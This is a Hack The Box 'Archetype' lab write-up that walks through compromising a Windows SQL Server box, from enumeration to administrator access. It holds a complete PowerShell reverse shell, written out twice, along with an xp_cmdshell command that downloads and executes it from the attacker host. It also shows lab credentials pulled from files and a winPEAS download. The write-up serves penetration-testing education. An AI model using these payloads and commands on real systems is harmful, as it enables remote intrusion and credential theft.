# Hack The Box - Archetype Writeup  
**Prepared by:** 0ne-nine9, ilinor  

---

## Enumeration

**Port scan (default scripts + versions):**

```bash
nmap -sC -sV 10.129.92.43
```

| Flag | Purpose |
|------|---------|
| `-sC` | Run Nmap’s **default** NSE script set (safe discovery) |
| `-sV` | **Version** and service fingerprinting on open ports |

**Nmap results:**
```text
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
```

### SMB enumeration

**List shares without a password** (`-N` = no password prompt; empty guest where allowed):

```bash
smbclient -N -L \\\\10.129.92.43\\
```

| Pattern | Meaning |
|---------|---------|
| `\\\\IP\\` | SMB URL form for `smbclient` (escape backslashes in shell) |
| `-L` | List shares |

Result shows the `backups` share is available.

### Accessing the Backups Share

**Connect to the `backups` share** with an empty username (anonymous / guest context depending on server):

```bash
smbclient \\\\10.129.92.43\\backups -U ""
```

`-U ""` avoids sending a different account name; if access fails, retry with `-N` per `smbclient` version.

Once inside, we list and download the only interesting file:

```bash
smb: \> dir
  prod.dtsConfig                   A     2896  Sat Jan 26 05:17:04 2019
smb: \> get prod.dtsConfig
```

This file is a **SQL Server configuration XML file**. It contains the **SQL credentials in cleartext**:

```xml
<ConfiguredValue>
  Data Source=.;
  Password=M3g4c0rp123;
  User ID=ARCHETYPE\sql_svc;
  Initial Catalog=Catalog;
  Provider=SQLNCLI10.1;
  Persist Security Info=True;
</ConfiguredValue>
```

 Extracted credentials:
- **Username:** ARCHETYPE\sql_svc  
- **Password:** M3g4c0rp123  

---

## Initial Foothold: MSSQL Access via Impacket

Locate `mssqlclient.py` from Impacket:

```bash
cd /usr/share/doc/python3-impacket/examples
```

**Impacket MSSQL client** (domain-style login with **Windows authentication**):

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.92.43 -windows-auth
```

| Part | Purpose |
|------|---------|
| `ARCHETYPE/sql_svc` | `DOMAIN\\user` form for SQL auth |
| `-windows-auth` | Use **NTLM/Kerberos-style** Windows auth instead of SQL-only login |

On success you receive a `SQL>` prompt.

---

## Enabling RCE via `xp_cmdshell`

By default **`xp_cmdshell`** is disabled. Enable it from a sufficiently privileged SQL principal:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

| Step | Meaning |
|------|---------|
| `show advanced options` | Allows changing extended options such as `xp_cmdshell` |
| `RECONFIGURE` | Applies pending configuration changes |

**Verify OS command execution:**

```sql
EXEC xp_cmdshell 'whoami';
```

Should return:
```text
archetype\sql_svc
```

At this point, **we have command execution as `sql_svc`** via SQL server.

---

## Reverse Shell via PowerShell

### Step 1: Create Reverse Shell Payload

Create a file named `shell.ps1` on your attacker machine:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.23",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

### Step 2: Host `shell.ps1` (attacker)

```bash
sudo python3 -m http.server 80
```

Serves the current directory on **TCP 80**; place `shell.ps1` there. Use a non-privileged port (e.g. `8080`) if 80 is in use.

### Step 3: Listener (attacker)

```bash
sudo nc -lvnp 4444
```

Must match **IP and port** embedded in `shell.ps1` (`TCPClient("10.10.14.23",4444)` in the snippet above—change both sides consistently).

### Step 4: Pull and execute from SQL Server

```sql
EXEC xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23/shell.ps1')";
```

| Fragment | Risk / note |
|----------|-------------|
| `IEX(…DownloadString…)` | Downloads and **executes** remote PowerShell—only use against lab targets you own |
| `Net.WebClient` | Legacy but common in CTF chains; `Invoke-WebRequest` is the modern equivalent |

If outbound HTTP from the SQL host is allowed, you receive a **reverse shell** as `sql_svc`.

---

## Enumerating System and Finding User Flag

Once inside:

```powershell
cd C:\Users\sql_svc\Desktop
type user.txt
```

 **User flag captured**

---

## Privilege Escalation with winPEAS

### Step 1: Upload `winPEAS` to Target

Host it on attacker box:

```bash
sudo python3 -m http.server 80
```

On the target (PowerShell):

```powershell
powershell -c "iwr http://10.10.14.23/winPEASx64.exe -outfile winpeas.exe"
```

`iwr` (`Invoke-WebRequest`) downloads the binary; adjust URL and filename to the PE release you host.

If it fails, debug output to file:

```powershell
powershell -ep Bypass .\winpeas.exe *> output.txt
```

After verifying a clean file:

```powershell
powershell -ep Bypass .\winpeas.exe > output.txt
```

Inspect `output.txt`.

---

### What We Found

Inside PowerShell history:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Found:

```plaintext
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

 This is **cleartext admin password** for user `administrator`.

---

## Root Shell via Evil-WinRM

**Remote management shell** (WinRM, TCP 5985 by default):

```bash
evil-winrm -i 10.129.92.43 -u administrator -p 'MEGACORP_4dm1n!!'
```

| Flag | Purpose |
|------|---------|
| `-i` | Target IP |
| `-u` / `-p` | Credentials (quote password if it contains shell metacharacters) |

Once inside:

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

 **Root flag captured**

---

## Summary of Steps

1. `nmap` reveals SMB and MSSQL
2. Anonymous access to `\\backups\` yields `prod.dtsConfig`
3. File reveals password `M3g4c0rp123` for `ARCHETYPE\sql_svc`
4. Login to MSSQL using Impacket `mssqlclient.py`
5. Enable `xp_cmdshell` and trigger PowerShell RCE
6. Host and run a PowerShell reverse shell to get foothold
7. Upload and execute `winPEAS`
8. Find `administrator` password in PowerShell history
9. Connect with `evil-winrm` and grab the root flag

**Lab status:** all flags and steps above completed for Archetype.

---

## Alternate path — PowerShell-only reverse shell

Some write-ups use **`nc64.exe`** on the target; the path documented in the main section uses a **hosted `shell.ps1`** and **`IEX(DownloadString)`** instead—no third-party binary on disk beyond what PowerShell loads in memory.

### Hosted reverse shell (same `shell.ps1` pattern)

Hosted and injected **PowerShell reverse shell** via `xp_cmdshell`:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.23",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

### Execution via SQL:

```sql
EXEC xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.23/shell.ps1')";
```

This yields an **interactive PowerShell** session over TCP without placing a separate netcat binary on the server.

---

### Finding a writable directory

From a constrained SQL-driven shell, traverse toward user-writable locations:

```powershell
cd ../../../
```

Eventually landing at:

```powershell
C:\Users\sql_svc\Downloads
```

Typical location to stage **`winPEAS`** or other tools.

---

### Troubleshooting winPEAS

If the first download is corrupt or execution errors appear, capture stderr/stdout:

```powershell
powershell -ep Bypass .\winpeas.ps1 *> output.txt
```

Upon discovering corruption, I re-downloaded the script and re-ran:

```powershell
powershell -ep Bypass .\winpeas.ps1 > output.txt
```

Re-download if needed, then review `output.txt` for **credentials**, **weak services**, and **privilege escalation** hints.

---

### Administrator password in PSReadLine history

Read the same history file as in the main section:

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Example material stored in history (lab-specific):

```text
Username: administrator
Password: MEGACORP_4dm1n!!
```

---

### Root access via Evil-WinRM (alternative to `psexec.py`)

`psexec.py` is another valid option; **`evil-winrm`** often gives a cleaner **WinRM** shell when port **5985** is open:

```bash
evil-winrm -i 10.129.92.43 -u administrator -p 'MEGACORP_4dm1n!!'
```

From there:

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

**Root flag:** retrieved from `Administrator\\Desktop` as in the main section.

---

